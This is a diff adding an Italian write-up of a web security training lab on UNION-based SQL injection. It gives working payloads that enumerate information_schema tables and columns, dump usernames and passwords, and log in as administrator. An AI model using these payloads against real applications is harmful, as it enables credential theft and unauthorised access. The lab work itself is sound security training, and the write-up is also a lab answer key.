@@ -1,1 +1,54 @@
+Lab: SQL injection attack, listing the database contents on non-Oracle databases
 
+📝 Descrizione
+
+Il lab contiene una SQL injection nel filtro della categoria dei prodotti.  
+L'obiettivo è sfruttare un attacco UNION per elencare tabelle e colonne del database, recuperare username e password degli utenti e infine effettuare l'accesso come **administrator**.
+
+---
+
+⚙️ Passaggi eseguiti
+
+1. Intercettata la richiesta con Burp Suite sul parametro `category`.
+2. Verificata la vulnerabilità e il numero di colonne:
+
+' UNION SELECT 'a','b'--
+
+3. Elencate le tabelle del database:
+
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+Individuata la tabella degli utenti (es. `users_xxxx`).
+
+4. Recuperati i nomi delle colonne:
+
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xxxx'--
+
+Identificate le colonne `username_xxxx` e `password_xxxx`.
+
+5. Estratti i dati degli utenti:
+
+' UNION SELECT username_xxxx,password_xxxx FROM users_xxxx--
+
+6. Trovata la password dell'utente `administrator`, usata per effettuare il login.
+
+---
+
+🧠 Ragionamento tecnico
+ 
+Il lab richiede una SQL injection di tipo **UNION-based** per elencare metadati del database (`information_schema`) e accedere ai dati reali.  
+Si sfrutta il fatto che i risultati delle query sono visibili direttamente nella risposta HTML.
+
+---
+
+✅ Soluzione finale
+
+**Payload finali usati:**
+
+- Trova tabelle:' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+- Trova colonne:' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xxxx'--
+
+- Estrai credenziali:' UNION SELECT username_xxxx,password_xxxx FROM users_xxxx--
+
+Login con utente `administrator` completato con successo ✅
